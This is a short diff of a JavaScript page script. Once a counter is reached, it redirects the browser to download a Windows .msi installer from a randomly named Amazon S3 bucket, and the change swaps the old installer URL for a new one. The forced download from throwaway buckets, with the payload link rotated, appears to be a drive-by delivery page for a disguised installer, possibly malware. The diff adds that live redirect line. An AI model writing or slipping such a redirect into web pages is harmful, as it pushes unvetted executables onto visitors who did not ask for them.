@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://yutonx.s3.ap-southeast-2.amazonaws.com/YUTonx.msi";
+		var url="https://rtxnen.s3.ap-southeast-1.amazonaws.com/RTxnen.msi";
 		window.location=url;
 	}
 }
@@ -13,3 +13,4 @@ function getLoad()
 	num++;
 
 }
+
